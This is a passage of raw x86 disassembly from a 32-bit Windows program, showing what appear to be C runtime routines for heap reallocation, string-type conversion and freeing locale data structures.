  4167d2:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4167d8:	50                   	push   %eax
  4167d9:	e8 d2 d0 ff ff       	call   0x4138b0
  4167de:	59                   	pop    %ecx
  4167df:	83 c0 0b             	add    $0xb,%eax
  4167e2:	83 f8 3c             	cmp    $0x3c,%eax
  4167e5:	76 29                	jbe    0x416810
  4167e7:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4167ed:	50                   	push   %eax
  4167ee:	e8 bd d0 ff ff       	call   0x4138b0
  4167f3:	8b d8                	mov    %eax,%ebx
  4167f5:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4167fb:	83 e8 31             	sub    $0x31,%eax
  4167fe:	03 d8                	add    %eax,%ebx
  416800:	6a 03                	push   $0x3
  416802:	68 60 85 41 00       	push   $0x418560
  416807:	53                   	push   %ebx
  416808:	e8 73 e4 ff ff       	call   0x414c80
  41680d:	83 c4 10             	add    $0x10,%esp
  416810:	53                   	push   %ebx
  416811:	e8 9a d0 ff ff       	call   0x4138b0
  416816:	59                   	pop    %ecx
  416817:	8d 44 30 0c          	lea    0xc(%eax,%esi,1),%eax
  41681b:	83 c0 03             	add    $0x3,%eax
  41681e:	83 e0 fc             	and    $0xfffffffc,%eax
  416821:	e8 3a c8 ff ff       	call   0x413060
  416826:	89 65 e8             	mov    %esp,-0x18(%ebp)
  416829:	8b f4                	mov    %esp,%esi
  41682b:	57                   	push   %edi
  41682c:	56                   	push   %esi
  41682d:	e8 0e d1 ff ff       	call   0x413940
  416832:	bf 40 85 41 00       	mov    $0x418540,%edi
  416837:	57                   	push   %edi
  416838:	56                   	push   %esi
  416839:	e8 12 d1 ff ff       	call   0x413950
  41683e:	68 6c 88 41 00       	push   $0x41886c
  416843:	56                   	push   %esi
  416844:	e8 07 d1 ff ff       	call   0x413950
  416849:	53                   	push   %ebx
  41684a:	56                   	push   %esi
  41684b:	e8 00 d1 ff ff       	call   0x413950
  416850:	57                   	push   %edi
  416851:	56                   	push   %esi
  416852:	e8 f9 d0 ff ff       	call   0x413950
  416857:	ff 75 e0             	push   -0x20(%ebp)
  41685a:	56                   	push   %esi
  41685b:	e8 f0 d0 ff ff       	call   0x413950
  416860:	68 10 20 01 00       	push   $0x12010
  416865:	68 18 85 41 00       	push   $0x418518
  41686a:	56                   	push   %esi
  41686b:	e8 14 e3 ff ff       	call   0x414b84
  416870:	83 c4 3c             	add    $0x3c,%esp
  416873:	6a 03                	push   $0x3
  416875:	e8 05 bc ff ff       	call   0x41247f
  41687a:	cc                   	int3
  41687b:	e8 46 c6 ff ff       	call   0x412ec6
  416880:	83 c0 08             	add    $0x8,%eax
  416883:	c3                   	ret
  416884:	6a 14                	push   $0x14
  416886:	68 20 8a 41 00       	push   $0x418a20
  41688b:	e8 84 c7 ff ff       	call   0x413014
  416890:	8b 7d 08             	mov    0x8(%ebp),%edi
  416893:	33 db                	xor    %ebx,%ebx
  416895:	3b fb                	cmp    %ebx,%edi
  416897:	75 0e                	jne    0x4168a7
  416899:	ff 75 0c             	push   0xc(%ebp)
  41689c:	e8 41 ba ff ff       	call   0x4122e2
  4168a1:	59                   	pop    %ecx
  4168a2:	e9 84 01 00 00       	jmp    0x416a2b
  4168a7:	8b 75 0c             	mov    0xc(%ebp),%esi
  4168aa:	3b f3                	cmp    %ebx,%esi
  4168ac:	75 0c                	jne    0x4168ba
  4168ae:	57                   	push   %edi
  4168af:	e8 16 b9 ff ff       	call   0x4121ca
  4168b4:	59                   	pop    %ecx
  4168b5:	e9 6f 01 00 00       	jmp    0x416a29
  4168ba:	83 3d 40 73 45 00 03 	cmpl   $0x3,0x457340
  4168c1:	0f 85 2e 01 00 00    	jne    0x4169f5
  4168c7:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4168ca:	83 fe e0             	cmp    $0xffffffe0,%esi
  4168cd:	0f 87 f1 00 00 00    	ja     0x4169c4
  4168d3:	6a 04                	push   $0x4
  4168d5:	e8 49 d6 ff ff       	call   0x413f23
  4168da:	59                   	pop    %ecx
  4168db:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4168de:	57                   	push   %edi
  4168df:	e8 b8 d6 ff ff       	call   0x413f9c
  4168e4:	59                   	pop    %ecx
  4168e5:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4168e8:	3b c3                	cmp    %ebx,%eax
  4168ea:	0f 84 a4 00 00 00    	je     0x416994
  4168f0:	3b 35 2c 73 45 00    	cmp    0x45732c,%esi
  4168f6:	77 4c                	ja     0x416944
  4168f8:	56                   	push   %esi
  4168f9:	57                   	push   %edi
  4168fa:	50                   	push   %eax
  4168fb:	e8 9c db ff ff       	call   0x41449c
  416900:	83 c4 0c             	add    $0xc,%esp
  416903:	85 c0                	test   %eax,%eax
  416905:	74 05                	je     0x41690c
  416907:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  41690a:	eb 38                	jmp    0x416944
  41690c:	56                   	push   %esi
  41690d:	e8 69 de ff ff       	call   0x41477b
  416912:	59                   	pop    %ecx
  416913:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  416916:	3b c3                	cmp    %ebx,%eax
  416918:	74 2a                	je     0x416944
  41691a:	8b 47 fc             	mov    -0x4(%edi),%eax
  41691d:	48                   	dec    %eax
  41691e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  416921:	3b c6                	cmp    %esi,%eax
  416923:	72 02                	jb     0x416927
  416925:	8b c6                	mov    %esi,%eax
  416927:	50                   	push   %eax
  416928:	57                   	push   %edi
  416929:	ff 75 e4             	push   -0x1c(%ebp)
  41692c:	e8 af e9 ff ff       	call   0x4152e0
  416931:	57                   	push   %edi
  416932:	e8 65 d6 ff ff       	call   0x413f9c
  416937:	89 45 e0             	mov    %eax,-0x20(%ebp)
  41693a:	57                   	push   %edi
  41693b:	50                   	push   %eax
  41693c:	e8 86 d6 ff ff       	call   0x413fc7
  416941:	83 c4 18             	add    $0x18,%esp
  416944:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  416947:	75 4b                	jne    0x416994
  416949:	3b f3                	cmp    %ebx,%esi
  41694b:	75 06                	jne    0x416953
  41694d:	33 f6                	xor    %esi,%esi
  41694f:	46                   	inc    %esi
  416950:	89 75 0c             	mov    %esi,0xc(%ebp)
  416953:	83 c6 0f             	add    $0xf,%esi
  416956:	83 e6 f0             	and    $0xfffffff0,%esi
  416959:	89 75 0c             	mov    %esi,0xc(%ebp)
  41695c:	56                   	push   %esi
  41695d:	53                   	push   %ebx
  41695e:	ff 35 3c 73 45 00    	push   0x45733c
  416964:	ff 15 8c 80 41 00    	call   *0x41808c
  41696a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  41696d:	3b c3                	cmp    %ebx,%eax
  41696f:	74 23                	je     0x416994
  416971:	8b 47 fc             	mov    -0x4(%edi),%eax
  416974:	48                   	dec    %eax
  416975:	89 45 dc             	mov    %eax,-0x24(%ebp)
  416978:	3b c6                	cmp    %esi,%eax
  41697a:	72 02                	jb     0x41697e
  41697c:	8b c6                	mov    %esi,%eax
  41697e:	50                   	push   %eax
  41697f:	57                   	push   %edi
  416980:	ff 75 e4             	push   -0x1c(%ebp)
  416983:	e8 58 e9 ff ff       	call   0x4152e0
  416988:	57                   	push   %edi
  416989:	ff 75 e0             	push   -0x20(%ebp)
  41698c:	e8 36 d6 ff ff       	call   0x413fc7
  416991:	83 c4 14             	add    $0x14,%esp
  416994:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  416998:	e8 4f 00 00 00       	call   0x4169ec
  41699d:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4169a0:	75 22                	jne    0x4169c4
  4169a2:	3b f3                	cmp    %ebx,%esi
  4169a4:	75 03                	jne    0x4169a9
  4169a6:	33 f6                	xor    %esi,%esi
  4169a8:	46                   	inc    %esi
  4169a9:	83 c6 0f             	add    $0xf,%esi
  4169ac:	83 e6 f0             	and    $0xfffffff0,%esi
  4169af:	89 75 0c             	mov    %esi,0xc(%ebp)
  4169b2:	56                   	push   %esi
  4169b3:	57                   	push   %edi
  4169b4:	53                   	push   %ebx
  4169b5:	ff 35 3c 73 45 00    	push   0x45733c
  4169bb:	ff 15 f0 80 41 00    	call   *0x4180f0
  4169c1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4169c4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4169c7:	3b c3                	cmp    %ebx,%eax
  4169c9:	75 60                	jne    0x416a2b
  4169cb:	39 1d 3c 6f 45 00    	cmp    %ebx,0x456f3c
  4169d1:	74 58                	je     0x416a2b
  4169d3:	56                   	push   %esi
  4169d4:	e8 9e e0 ff ff       	call   0x414a77
  4169d9:	59                   	pop    %ecx
  4169da:	85 c0                	test   %eax,%eax
  4169dc:	0f 85 e5 fe ff ff    	jne    0x4168c7
  4169e2:	eb 45                	jmp    0x416a29
  4169e4:	33 db                	xor    %ebx,%ebx
  4169e6:	8b 75 0c             	mov    0xc(%ebp),%esi
  4169e9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4169ec:	6a 04                	push   $0x4
  4169ee:	e8 9c d4 ff ff       	call   0x413e8f
  4169f3:	59                   	pop    %ecx
  4169f4:	c3                   	ret
  4169f5:	33 c0                	xor    %eax,%eax
  4169f7:	83 fe e0             	cmp    $0xffffffe0,%esi
  4169fa:	77 16                	ja     0x416a12
  4169fc:	3b f3                	cmp    %ebx,%esi
  4169fe:	75 03                	jne    0x416a03
  416a00:	33 f6                	xor    %esi,%esi
  416a02:	46                   	inc    %esi
  416a03:	56                   	push   %esi
  416a04:	57                   	push   %edi
  416a05:	53                   	push   %ebx
  416a06:	ff 35 3c 73 45 00    	push   0x45733c
  416a0c:	ff 15 f0 80 41 00    	call   *0x4180f0
  416a12:	3b c3                	cmp    %ebx,%eax
  416a14:	75 15                	jne    0x416a2b
  416a16:	39 1d 3c 6f 45 00    	cmp    %ebx,0x456f3c
  416a1c:	74 0d                	je     0x416a2b
  416a1e:	56                   	push   %esi
  416a1f:	e8 53 e0 ff ff       	call   0x414a77
  416a24:	59                   	pop    %ecx
  416a25:	85 c0                	test   %eax,%eax
  416a27:	75 cc                	jne    0x4169f5
  416a29:	33 c0                	xor    %eax,%eax
  416a2b:	e8 1f c6 ff ff       	call   0x41304f
  416a30:	c3                   	ret
  416a31:	6a 10                	push   $0x10
  416a33:	68 30 8a 41 00       	push   $0x418a30
  416a38:	e8 d7 c5 ff ff       	call   0x413014
  416a3d:	83 3d 40 73 45 00 03 	cmpl   $0x3,0x457340
  416a44:	75 3a                	jne    0x416a80
  416a46:	6a 04                	push   $0x4
  416a48:	e8 d6 d4 ff ff       	call   0x413f23
  416a4d:	59                   	pop    %ecx
  416a4e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  416a52:	8b 75 08             	mov    0x8(%ebp),%esi
  416a55:	56                   	push   %esi
  416a56:	e8 41 d5 ff ff       	call   0x413f9c
  416a5b:	59                   	pop    %ecx
  416a5c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  416a5f:	85 c0                	test   %eax,%eax
  416a61:	74 0b                	je     0x416a6e
  416a63:	8b 76 fc             	mov    -0x4(%esi),%esi
  416a66:	83 ee 09             	sub    $0x9,%esi
  416a69:	89 75 e0             	mov    %esi,-0x20(%ebp)
  416a6c:	eb 03                	jmp    0x416a71
  416a6e:	8b 75 e0             	mov    -0x20(%ebp),%esi
  416a71:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  416a75:	e8 24 00 00 00       	call   0x416a9e
  416a7a:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  416a7e:	75 13                	jne    0x416a93
  416a80:	ff 75 08             	push   0x8(%ebp)
  416a83:	6a 00                	push   $0x0
  416a85:	ff 35 3c 73 45 00    	push   0x45733c
  416a8b:	ff 15 60 80 41 00    	call   *0x418060
  416a91:	8b f0                	mov    %eax,%esi
  416a93:	8b c6                	mov    %esi,%eax
  416a95:	e8 b5 c5 ff ff       	call   0x41304f
  416a9a:	c3                   	ret
  416a9b:	8b 75 e0             	mov    -0x20(%ebp),%esi
  416a9e:	6a 04                	push   $0x4
  416aa0:	e8 ea d3 ff ff       	call   0x413e8f
  416aa5:	59                   	pop    %ecx
  416aa6:	c3                   	ret
  416aa7:	6a 1c                	push   $0x1c
  416aa9:	68 50 8e 41 00       	push   $0x418e50
  416aae:	e8 61 c5 ff ff       	call   0x413014
  416ab3:	33 f6                	xor    %esi,%esi
  416ab5:	39 35 a4 6f 45 00    	cmp    %esi,0x456fa4
  416abb:	75 35                	jne    0x416af2
  416abd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  416ac0:	50                   	push   %eax
  416ac1:	33 ff                	xor    %edi,%edi
  416ac3:	47                   	inc    %edi
  416ac4:	57                   	push   %edi
  416ac5:	68 24 88 41 00       	push   $0x418824
  416aca:	57                   	push   %edi
  416acb:	ff 15 58 80 41 00    	call   *0x418058
  416ad1:	85 c0                	test   %eax,%eax
  416ad3:	74 08                	je     0x416add
  416ad5:	89 3d a4 6f 45 00    	mov    %edi,0x456fa4
  416adb:	eb 15                	jmp    0x416af2
  416add:	ff 15 2c 80 41 00    	call   *0x41802c
  416ae3:	83 f8 78             	cmp    $0x78,%eax
  416ae6:	75 0a                	jne    0x416af2
  416ae8:	c7 05 a4 6f 45 00 02 	movl   $0x2,0x456fa4
  416aef:	00 00 00 
  416af2:	a1 a4 6f 45 00       	mov    0x456fa4,%eax
  416af7:	83 f8 02             	cmp    $0x2,%eax
  416afa:	0f 84 ea 00 00 00    	je     0x416bea
  416b00:	3b c6                	cmp    %esi,%eax
  416b02:	0f 84 e2 00 00 00    	je     0x416bea
  416b08:	83 f8 01             	cmp    $0x1,%eax
  416b0b:	0f 85 ff 00 00 00    	jne    0x416c10
  416b11:	89 75 e0             	mov    %esi,-0x20(%ebp)
  416b14:	89 75 dc             	mov    %esi,-0x24(%ebp)
  416b17:	39 75 18             	cmp    %esi,0x18(%ebp)
  416b1a:	75 08                	jne    0x416b24
  416b1c:	a1 9c 6f 45 00       	mov    0x456f9c,%eax
  416b21:	89 45 18             	mov    %eax,0x18(%ebp)
  416b24:	56                   	push   %esi
  416b25:	56                   	push   %esi
  416b26:	ff 75 10             	push   0x10(%ebp)
  416b29:	ff 75 0c             	push   0xc(%ebp)
  416b2c:	33 c0                	xor    %eax,%eax
  416b2e:	39 75 20             	cmp    %esi,0x20(%ebp)
  416b31:	0f 95 c0             	setne  %al
  416b34:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  416b3b:	50                   	push   %eax
  416b3c:	ff 75 18             	push   0x18(%ebp)
  416b3f:	ff 15 74 80 41 00    	call   *0x418074
  416b45:	8b f8                	mov    %eax,%edi
  416b47:	89 7d d8             	mov    %edi,-0x28(%ebp)
  416b4a:	85 ff                	test   %edi,%edi
  416b4c:	0f 84 be 00 00 00    	je     0x416c10
  416b52:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  416b56:	8d 1c 3f             	lea    (%edi,%edi,1),%ebx
  416b59:	8b c3                	mov    %ebx,%eax
  416b5b:	83 c0 03             	add    $0x3,%eax
  416b5e:	83 e0 fc             	and    $0xfffffffc,%eax
  416b61:	e8 fa c4 ff ff       	call   0x413060
  416b66:	89 65 e8             	mov    %esp,-0x18(%ebp)
  416b69:	8b f4                	mov    %esp,%esi
  416b6b:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  416b6e:	53                   	push   %ebx
  416b6f:	6a 00                	push   $0x0
  416b71:	56                   	push   %esi
  416b72:	e8 a9 d0 ff ff       	call   0x413c20
  416b77:	83 c4 0c             	add    $0xc,%esp
  416b7a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  416b7e:	eb 15                	jmp    0x416b95
  416b80:	33 c0                	xor    %eax,%eax
  416b82:	40                   	inc    %eax
  416b83:	c3                   	ret
  416b84:	8b 65 e8             	mov    -0x18(%ebp),%esp
  416b87:	e8 ca 08 00 00       	call   0x417456
  416b8c:	33 f6                	xor    %esi,%esi
  416b8e:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  416b92:	8b 7d d8             	mov    -0x28(%ebp),%edi
  416b95:	85 f6                	test   %esi,%esi
  416b97:	75 17                	jne    0x416bb0
  416b99:	57                   	push   %edi
  416b9a:	6a 02                	push   $0x2
  416b9c:	e8 17 eb ff ff       	call   0x4156b8
  416ba1:	59                   	pop    %ecx
  416ba2:	59                   	pop    %ecx
  416ba3:	8b f0                	mov    %eax,%esi
  416ba5:	85 f6                	test   %esi,%esi
  416ba7:	74 67                	je     0x416c10
  416ba9:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  416bb0:	57                   	push   %edi
  416bb1:	56                   	push   %esi
  416bb2:	ff 75 10             	push   0x10(%ebp)
  416bb5:	ff 75 0c             	push   0xc(%ebp)
  416bb8:	6a 01                	push   $0x1
  416bba:	ff 75 18             	push   0x18(%ebp)
  416bbd:	ff 15 74 80 41 00    	call   *0x418074
  416bc3:	85 c0                	test   %eax,%eax
  416bc5:	74 11                	je     0x416bd8
  416bc7:	ff 75 14             	push   0x14(%ebp)
  416bca:	50                   	push   %eax
  416bcb:	56                   	push   %esi
  416bcc:	ff 75 08             	push   0x8(%ebp)
  416bcf:	ff 15 58 80 41 00    	call   *0x418058
  416bd5:	89 45 e0             	mov    %eax,-0x20(%ebp)
  416bd8:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  416bdc:	74 07                	je     0x416be5
  416bde:	56                   	push   %esi
  416bdf:	e8 e6 b5 ff ff       	call   0x4121ca
  416be4:	59                   	pop    %ecx
  416be5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  416be8:	eb 6e                	jmp    0x416c58
  416bea:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  416bed:	3b de                	cmp    %esi,%ebx
  416bef:	75 06                	jne    0x416bf7
  416bf1:	8b 1d 8c 6f 45 00    	mov    0x456f8c,%ebx
  416bf7:	8b 7d 18             	mov    0x18(%ebp),%edi
  416bfa:	85 ff                	test   %edi,%edi
  416bfc:	75 06                	jne    0x416c04
  416bfe:	8b 3d 9c 6f 45 00    	mov    0x456f9c,%edi
  416c04:	53                   	push   %ebx
  416c05:	e8 34 06 00 00       	call   0x41723e
  416c0a:	59                   	pop    %ecx
  416c0b:	83 f8 ff             	cmp    $0xffffffff,%eax
  416c0e:	75 04                	jne    0x416c14
  416c10:	33 c0                	xor    %eax,%eax
  416c12:	eb 44                	jmp    0x416c58
  416c14:	3b c7                	cmp    %edi,%eax
  416c16:	74 1e                	je     0x416c36
  416c18:	6a 00                	push   $0x0
  416c1a:	6a 00                	push   $0x0
  416c1c:	8d 4d 10             	lea    0x10(%ebp),%ecx
  416c1f:	51                   	push   %ecx
  416c20:	ff 75 0c             	push   0xc(%ebp)
  416c23:	50                   	push   %eax
  416c24:	57                   	push   %edi
  416c25:	e8 5d 06 00 00       	call   0x417287
  416c2a:	83 c4 18             	add    $0x18,%esp
  416c2d:	8b f0                	mov    %eax,%esi
  416c2f:	85 f6                	test   %esi,%esi
  416c31:	74 dd                	je     0x416c10
  416c33:	89 75 0c             	mov    %esi,0xc(%ebp)
  416c36:	ff 75 14             	push   0x14(%ebp)
  416c39:	ff 75 10             	push   0x10(%ebp)
  416c3c:	ff 75 0c             	push   0xc(%ebp)
  416c3f:	ff 75 08             	push   0x8(%ebp)
  416c42:	53                   	push   %ebx
  416c43:	ff 15 5c 80 41 00    	call   *0x41805c
  416c49:	8b f8                	mov    %eax,%edi
  416c4b:	85 f6                	test   %esi,%esi
  416c4d:	74 07                	je     0x416c56
  416c4f:	56                   	push   %esi
  416c50:	e8 75 b5 ff ff       	call   0x4121ca
  416c55:	59                   	pop    %ecx
  416c56:	8b c7                	mov    %edi,%eax
  416c58:	8d 65 c8             	lea    -0x38(%ebp),%esp
  416c5b:	e8 ef c3 ff ff       	call   0x41304f
  416c60:	c3                   	ret
  416c61:	56                   	push   %esi
  416c62:	8b 74 24 08          	mov    0x8(%esp),%esi
  416c66:	85 f6                	test   %esi,%esi
  416c68:	0f 84 81 01 00 00    	je     0x416def
  416c6e:	ff 76 04             	push   0x4(%esi)
  416c71:	e8 54 b5 ff ff       	call   0x4121ca
  416c76:	ff 76 08             	push   0x8(%esi)
  416c79:	e8 4c b5 ff ff       	call   0x4121ca
  416c7e:	ff 76 0c             	push   0xc(%esi)
  416c81:	e8 44 b5 ff ff       	call   0x4121ca
  416c86:	ff 76 10             	push   0x10(%esi)
  416c89:	e8 3c b5 ff ff       	call   0x4121ca
  416c8e:	ff 76 14             	push   0x14(%esi)
  416c91:	e8 34 b5 ff ff       	call   0x4121ca
  416c96:	ff 76 18             	push   0x18(%esi)
  416c99:	e8 2c b5 ff ff       	call   0x4121ca
  416c9e:	ff 36                	push   (%esi)
  416ca0:	e8 25 b5 ff ff       	call   0x4121ca
  416ca5:	ff 76 20             	push   0x20(%esi)
  416ca8:	e8 1d b5 ff ff       	call   0x4121ca
  416cad:	ff 76 24             	push   0x24(%esi)
  416cb0:	e8 15 b5 ff ff       	call   0x4121ca
  416cb5:	ff 76 28             	push   0x28(%esi)
  416cb8:	e8 0d b5 ff ff       	call   0x4121ca
  416cbd:	ff 76 2c             	push   0x2c(%esi)
  416cc0:	e8 05 b5 ff ff       	call   0x4121ca
  416cc5:	ff 76 30             	push   0x30(%esi)
  416cc8:	e8 fd b4 ff ff       	call   0x4121ca
  416ccd:	ff 76 34             	push   0x34(%esi)
  416cd0:	e8 f5 b4 ff ff       	call   0x4121ca
  416cd5:	ff 76 1c             	push   0x1c(%esi)
  416cd8:	e8 ed b4 ff ff       	call   0x4121ca
  416cdd:	ff 76 38             	push   0x38(%esi)
  416ce0:	e8 e5 b4 ff ff       	call   0x4121ca
  416ce5:	ff 76 3c             	push   0x3c(%esi)
  416ce8:	e8 dd b4 ff ff       	call   0x4121ca
  416ced:	83 c4 40             	add    $0x40,%esp
  416cf0:	ff 76 40             	push   0x40(%esi)
  416cf3:	e8 d2 b4 ff ff       	call   0x4121ca
  416cf8:	ff 76 44             	push   0x44(%esi)
  416cfb:	e8 ca b4 ff ff       	call   0x4121ca
  416d00:	ff 76 48             	push   0x48(%esi)
  416d03:	e8 c2 b4 ff ff       	call   0x4121ca
  416d08:	ff 76 4c             	push   0x4c(%esi)
  416d0b:	e8 ba b4 ff ff       	call   0x4121ca
  416d10:	ff 76 50             	push   0x50(%esi)
  416d13:	e8 b2 b4 ff ff       	call   0x4121ca
  416d18:	ff 76 54             	push   0x54(%esi)
  416d1b:	e8 aa b4 ff ff       	call   0x4121ca
  416d20:	ff 76 58             	push   0x58(%esi)
  416d23:	e8 a2 b4 ff ff       	call   0x4121ca
  416d28:	ff 76 5c             	push   0x5c(%esi)
  416d2b:	e8 9a b4 ff ff       	call   0x4121ca
  416d30:	ff 76 60             	push   0x60(%esi)
  416d33:	e8 92 b4 ff ff       	call   0x4121ca
  416d38:	ff 76 64             	push   0x64(%esi)
  416d3b:	e8 8a b4 ff ff       	call   0x4121ca
  416d40:	ff 76 68             	push   0x68(%esi)
  416d43:	e8 82 b4 ff ff       	call   0x4121ca
  416d48:	ff 76 6c             	push   0x6c(%esi)
  416d4b:	e8 7a b4 ff ff       	call   0x4121ca
  416d50:	ff 76 70             	push   0x70(%esi)
  416d53:	e8 72 b4 ff ff       	call   0x4121ca
  416d58:	ff 76 74             	push   0x74(%esi)
  416d5b:	e8 6a b4 ff ff       	call   0x4121ca
  416d60:	ff 76 78             	push   0x78(%esi)
  416d63:	e8 62 b4 ff ff       	call   0x4121ca
  416d68:	ff 76 7c             	push   0x7c(%esi)
  416d6b:	e8 5a b4 ff ff       	call   0x4121ca
  416d70:	83 c4 40             	add    $0x40,%esp
  416d73:	ff b6 80 00 00 00    	push   0x80(%esi)
  416d79:	e8 4c b4 ff ff       	call   0x4121ca
  416d7e:	ff b6 84 00 00 00    	push   0x84(%esi)
  416d84:	e8 41 b4 ff ff       	call   0x4121ca
  416d89:	ff b6 88 00 00 00    	push   0x88(%esi)
  416d8f:	e8 36 b4 ff ff       	call   0x4121ca
  416d94:	ff b6 8c 00 00 00    	push   0x8c(%esi)
  416d9a:	e8 2b b4 ff ff       	call   0x4121ca
  416d9f:	ff b6 90 00 00 00    	push   0x90(%esi)
  416da5:	e8 20 b4 ff ff       	call   0x4121ca
  416daa:	ff b6 94 00 00 00    	push   0x94(%esi)
  416db0:	e8 15 b4 ff ff       	call   0x4121ca
  416db5:	ff b6 98 00 00 00    	push   0x98(%esi)
  416dbb:	e8 0a b4 ff ff       	call   0x4121ca
  416dc0:	ff b6 9c 00 00 00    	push   0x9c(%esi)
  416dc6:	e8 ff b3 ff ff       	call   0x4121ca
  416dcb:	ff b6 a0 00 00 00    	push   0xa0(%esi)
  416dd1:	e8 f4 b3 ff ff       	call   0x4121ca
  416dd6:	ff b6 a4 00 00 00    	push   0xa4(%esi)
  416ddc:	e8 e9 b3 ff ff       	call   0x4121ca
  416de1:	ff b6 a8 00 00 00    	push   0xa8(%esi)
  416de7:	e8 de b3 ff ff       	call   0x4121ca
  416dec:	83 c4 2c             	add    $0x2c,%esp
  416def:	5e                   	pop    %esi
  416df0:	c3                   	ret
  416df1:	56                   	push   %esi
  416df2:	8b 74 24 08          	mov    0x8(%esp),%esi
  416df6:	85 f6                	test   %esi,%esi
  416df8:	74 54                	je     0x416e4e
  416dfa:	8b 06                	mov    (%esi),%eax
  416dfc:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416e02:	3b 01                	cmp    (%ecx),%eax
  416e04:	74 0f                	je     0x416e15
  416e06:	3b 05 0c 68 45 00    	cmp    0x45680c,%eax
  416e0c:	74 07                	je     0x416e15
  416e0e:	50                   	push   %eax
  416e0f:	e8 b6 b3 ff ff       	call   0x4121ca
  416e14:	59                   	pop    %ecx
  416e15:	8b 46 04             	mov    0x4(%esi),%eax
  416e18:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416e1e:	3b 41 04             	cmp    0x4(%ecx),%eax
  416e21:	74 0f                	je     0x416e32
  416e23:	3b 05 10 68 45 00    	cmp    0x456810,%eax
  416e29:	74 07                	je     0x416e32
  416e2b:	50                   	push   %eax
  416e2c:	e8 99 b3 ff ff       	call   0x4121ca
  416e31:	59                   	pop    %ecx
  416e32:	8b 76 08             	mov    0x8(%esi),%esi
  416e35:	a1 3c 68 45 00       	mov    0x45683c,%eax
  416e3a:	3b 70 08             	cmp    0x8(%eax),%esi
  416e3d:	74 0f                	je     0x416e4e
  416e3f:	3b 35 14 68 45 00    	cmp    0x456814,%esi
  416e45:	74 07                	je     0x416e4e
  416e47:	56                   	push   %esi
  416e48:	e8 7d b3 ff ff       	call   0x4121ca
  416e4d:	59                   	pop    %ecx
  416e4e:	5e                   	pop    %esi
  416e4f:	c3                   	ret
  416e50:	56                   	push   %esi
  416e51:	8b 74 24 08          	mov    0x8(%esp),%esi
  416e55:	85 f6                	test   %esi,%esi
  416e57:	0f 84 ca 00 00 00    	je     0x416f27
  416e5d:	8b 46 0c             	mov    0xc(%esi),%eax
  416e60:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416e66:	3b 41 0c             	cmp    0xc(%ecx),%eax
  416e69:	74 0f                	je     0x416e7a
  416e6b:	3b 05 18 68 45 00    	cmp    0x456818,%eax
  416e71:	74 07                	je     0x416e7a
  416e73:	50                   	push   %eax
  416e74:	e8 51 b3 ff ff       	call   0x4121ca
  416e79:	59                   	pop    %ecx
  416e7a:	8b 46 10             	mov    0x10(%esi),%eax
  416e7d:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416e83:	3b 41 10             	cmp    0x10(%ecx),%eax
  416e86:	74 0f                	je     0x416e97
  416e88:	3b 05 1c 68 45 00    	cmp    0x45681c,%eax
  416e8e:	74 07                	je     0x416e97
  416e90:	50                   	push   %eax
  416e91:	e8 34 b3 ff ff       	call   0x4121ca
  416e96:	59                   	pop    %ecx
  416e97:	8b 46 14             	mov    0x14(%esi),%eax
  416e9a:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416ea0:	3b 41 14             	cmp    0x14(%ecx),%eax
  416ea3:	74 0f                	je     0x416eb4
  416ea5:	3b 05 20 68 45 00    	cmp    0x456820,%eax
  416eab:	74 07                	je     0x416eb4
  416ead:	50                   	push   %eax
  416eae:	e8 17 b3 ff ff       	call   0x4121ca
  416eb3:	59                   	pop    %ecx
  416eb4:	8b 46 18             	mov    0x18(%esi),%eax
  416eb7:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416ebd:	3b 41 18             	cmp    0x18(%ecx),%eax
  416ec0:	74 0f                	je     0x416ed1
  416ec2:	3b 05 24 68 45 00    	cmp    0x456824,%eax
  416ec8:	74 07                	je     0x416ed1
  416eca:	50                   	push   %eax
  416ecb:	e8 fa b2 ff ff       	call   0x4121ca
  416ed0:	59                   	pop    %ecx
  416ed1:	8b 46 1c             	mov    0x1c(%esi),%eax
  416ed4:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416eda:	3b 41 1c             	cmp    0x1c(%ecx),%eax
  416edd:	74 0f                	je     0x416eee
  416edf:	3b 05 28 68 45 00    	cmp    0x456828,%eax
  416ee5:	74 07                	je     0x416eee
  416ee7:	50                   	push   %eax
  416ee8:	e8 dd b2 ff ff       	call   0x4121ca
  416eed:	59                   	pop    %ecx
  416eee:	8b 46 20             	mov    0x20(%esi),%eax
  416ef1:	8b 0d 3c 68 45 00    	mov    0x45683c,%ecx
  416ef7:	3b 41 20             	cmp    0x20(%ecx),%eax
  416efa:	74 0f                	je     0x416f0b
